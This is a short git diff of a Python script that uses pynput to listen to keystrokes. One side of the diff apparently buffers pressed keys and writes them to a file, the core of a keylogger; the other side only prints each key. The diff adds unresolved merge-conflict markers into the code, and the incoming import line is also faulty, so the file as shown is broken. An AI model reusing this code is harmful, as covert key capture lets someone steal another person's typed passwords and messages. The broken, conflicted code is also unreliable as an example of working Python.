@@ -1,4 +1,5 @@
 import pynput
+<<<<<<< HEAD
 from pynput.keyboard import Key, Listener
 
 count = 0
@@ -38,6 +39,13 @@ def on_press(key):
         write_file(keys)
         keys = []
     #print("{0} pressed".format(key))
+=======
+from pynput import keyboard, Key, Listener
+
+
+def on_press(key):
+    print("{0} pressed".format(key))
+>>>>>>> c534fd23efe5dacafb4ec789826fe349d9972e32
 
 def on_release(key):
     if key == Key.esc:
